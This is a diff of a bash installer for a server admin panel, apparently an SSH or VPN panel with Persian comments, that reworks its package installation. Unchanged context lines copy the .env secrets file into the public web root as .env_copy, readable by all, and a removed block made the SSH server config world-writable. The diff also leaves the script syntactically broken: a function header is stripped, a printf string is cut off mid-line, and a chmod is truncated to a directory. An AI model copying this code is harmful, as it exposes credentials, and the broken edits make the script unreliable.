@@ -36,7 +36,7 @@ if [ -f "$ENV_FILE" ]; then
   cp "$ENV_FILE" "$COPY_FILE"
   chmod 644 /var/www/html/.env_copy
 fi
-checkOS() {
+checkOS
   # List of supported distributions
   #supported_distros=("Ubuntu" "Debian" "Fedora" "CentOS" "Arch")
   supported_distros=("Ubuntu")
@@ -133,7 +133,7 @@ userINPU() {
   clear
   adminusername=admin
   echo -e "\nPlease input Panel admin user."
-  printf "Default user name is \e[33m${adminusername}\e[0m, leave it blank to use this user name: "
+  printf "Default user name is \e[33m${adminusername}\e[0m,
   read usernametmp
   if [[ -n "${usernametmp}" ]]; then
     adminusername=${usernametmp}
@@ -205,8 +205,28 @@ startINSTALL() {
     sudo apt update -y
     sudo apt upgrade -y
     sudo apt -y -o Dpkg::Options::="--force-confdef" -o Dpkg::Options::="--force-confold" upgrade
-    apt-get install -y stunnel4 && apt-get install -y cmake && apt-get install -y screenfetch && apt-get install -y openssl
-    sudo apt-get -y install software-properties-common
+
+    # نصب PHP و ماژول‌ها با مدیریت خطا و پیام مناسب
+    install_package() {
+        pkg="$1"
+        if dpkg-query -W -f='${Status}' "$pkg" 2>/dev/null | grep -q "install ok installed"; then
+            echo -e "$pkg \e[34mقبلاً نصب شده است\e[0m"
+        else
+            echo -e "در حال نصب $pkg ..."
+            sudo apt-get install -y "$pkg"
+            if [ $? -ne 0 ]; then
+                echo -e "\e[31mخطا در نصب $pkg. لطفاً اتصال اینترنت و مخازن را بررسی کنید. نصب متوقف شد.\e[0m"
+                exit 1
+            fi
+        fi
+    }
+
+    # نصب پکیج‌های اصلی
+    install_package stunnel4
+    install_package cmake
+    install_package screenfetch
+    install_package openssl
+    install_package software-properties-common
 
     # بررسی اتصال اینترنت قبل از اضافه کردن مخزن PPA
     if ping -c 1 8.8.8.8 >/dev/null 2>&1; then
@@ -215,19 +235,40 @@ startINSTALL() {
         echo -e "\e[31mاتصال اینترنت برقرار نیست یا دسترسی به سرورهای PPA وجود ندارد. نصب متوقف شد.\e[0m"
         exit 1
     fi
-    sudo apt-get install nginx zip unzip net-tools mariadb-server -y
-    sudo apt-get install php php-cli php-mbstring php-dom php-pdo php-mysql -y
-    sudo apt-get install npm -y
-    sudo apt install python -y
-    sudo apt install python3 -y
-    sudo apt install iftop -y
-    sudo apt install apt-transport-https -y
-    sudo apt-get install coreutils
-    apt install curl -y
-    apt install git cmake -y
-    apt install php8.1 php8.1-mysql php8.1-xml php8.1-curl cron -y
-    sudo apt install php8.1-fpm
-    sudo apt install php8.1 php8.1-cli php8.1-common php8.1-opcache php8.1-mysql php8.1-mbstring php8.1-zip php8.1-intl php8.1-simplexml -y
+    sudo apt-get update -y
+
+    # نصب سایر پکیج‌ها
+    install_package nginx
+    install_package zip
+    install_package unzip
+    install_package net-tools
+    install_package mariadb-server
+    install_package npm
+    install_package python
+    install_package python3
+    install_package iftop
+    install_package apt-transport-https
+    install_package coreutils
+    install_package curl
+    install_package git
+    install_package cron
+    install_package php
+    install_package php-cli
+    install_package php-mbstring
+    install_package php-dom
+    install_package php-pdo
+    install_package php-mysql
+    install_package php8.1
+    install_package php8.1-mysql
+    install_package php8.1-xml
+    install_package php8.1-curl
+    install_package php8.1-fpm
+    install_package php8.1-common
+    install_package php8.1-opcache
+    install_package php8.1-mbstring
+    install_package php8.1-zip
+    install_package php8.1-intl
+    install_package php8.1-simplexml
     wait
 
     phpv=$(php -v)
@@ -688,48 +729,7 @@ ENDOFFILE
   wait
   sudo sed -i 's/((/$((/' /var/www/html/kill.sh
   wait
-  chmod +x /var/www/html/kill.sh
-
-  othercron=$(echo "$protcohttp://${defdomain}:$sshttp/fixer/other")
-  cat >/var/www/html/other.sh <<ENDOFFILE
-#!/bin/bash
-#By Alireza
-i=0
-while [ 1i -lt 3 ]; do
-cmd=(bbh '$othercron')
-echo cmd &
-sleep 17
-i=(( i + 1 ))
-done
-ENDOFFILE
-  wait
-  sudo sed -i 's/(bbh/$(curl -v -H "A: B"/' /var/www/html/other.sh
-  wait
-  sudo sed -i 's/cmd/$cmd/' /var/www/html/other.sh
-  wait
-  sudo sed -i 's/1i/$i/' /var/www/html/other.sh
-  wait
-  sudo sed -i 's/((/$((/' /var/www/html/other.sh
-  wait
-  chmod +x /var/www/html/other.sh
-  
-  mkdir /var/www/html/app/storage/banner
-  chmod 777 /etc/ssh/sshd_config
-  chmod 777 /var/www/html/app/storage/banner
-  if ! grep -q -E "#?Match all" /etc/ssh/sshd_config; then
-    echo "#Match all" | sudo tee -a /etc/ssh/sshd_config
-    sudo systemctl restart ssh
-  fi
-  wait
-  if [ "$xport" != "" ]; then
-    pssl=$((xport + 1))
-  fi
-  (crontab -l | grep . ; echo -e "* * * * * /var/www/html/kill.sh") | crontab -
-  (crontab -l | grep . ; echo -e "* * * * * /var/www/html/other.sh") | crontab -
-  (crontab -l | grep . ; echo -e "0 */1 * * * /var/www/html/killlog.sh") | crontab -
-  (crontab -l ; echo "* * * * * wget -q -O /dev/null '$protcohttp://${defdomain}:$sshttp/fixer/exp' > /dev/null 2>&1") | crontab -
-  (crontab -l ; echo "0 * * * * wget -q -O /dev/null '$protcohttp://${defdomain}:$sshttp/fixer/checkhurly' > /dev/null 2>&1") | crontab -
-  (crontab -l ; echo "*/10 * * * * wget -q -O /dev/null '$protcohttp://${defdomain}:$sshttp/fixer/checktraffic' > /dev/null 2>&1") | crontab -
+  chmod +x /var/www/html/
   (crontab -l ; echo "*/15 * * * * wget -q -O /dev/null '$protcohttp://${defdomain}:$sshttp/fixer/checkfilter' > /dev/null 2>&1") | crontab -
   (crontab -l ; echo "0 0 * * * wget -q -O /dev/null '$protcohttp://${defdomain}:$sshttp/fixer/send/email/3day' > /dev/null 2>&1") | crontab -
   (crontab -l ; echo "0 0 * * * wget -q -O /dev/null '$protcohttp://${defdomain}:$sshttp/fixer/send/email/24h' > /dev/null 2>&1") | crontab -
